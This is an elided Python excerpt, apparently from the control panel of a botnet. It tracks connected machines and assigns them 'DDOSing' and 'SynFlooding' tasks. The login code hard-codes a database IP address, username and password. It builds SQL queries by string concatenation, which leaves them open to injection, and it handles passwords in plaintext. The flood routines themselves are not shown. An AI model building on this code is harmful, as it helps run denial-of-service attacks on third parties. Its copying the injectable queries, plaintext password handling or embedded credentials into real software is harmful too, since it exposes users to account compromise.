    ...
    def sLogin(self):
        ...
        try:
            conn = mdb.connect('184.168.194.11','goldenboy',
                               'P@ssw0rd','goldenboy')
            cursor = conn.cursor()
            cursor.execute("SELECT Password FROM Users WHERE Username = '" + str(self.user) + "';")
    ...
    def sNewPW(self):
        ...
        try:
            ...
            if str(data) != "None":
                if str(data[0]) == old:
                    cursor2 = conn.cursor()
                    cursor2.execute("UPDATE Users SET Password='" + str(new) + "' WHERE Username = '" + str(self.user) + "';")
...
class GetConnections (threading.Thread):
    def run (self):
    	...
    	while self.running:
            ...
            if ddosing == '1':
                task = "DDOSing..."
                wait = threading.Thread(target=Wait, args=(int("2"),))
                wait.start()
            if synflooding == '1':
                task = "SynFlooding..."
                wait = threading.Thread(target=Wait, args=(int("2"),))
            ...
            found = False
            if len(l) == 0:
                l.append([conn, addr, info, task, ip, mutex])
                myapp.sListUpdate()
            else:
                for p in l:
                    if found == False:
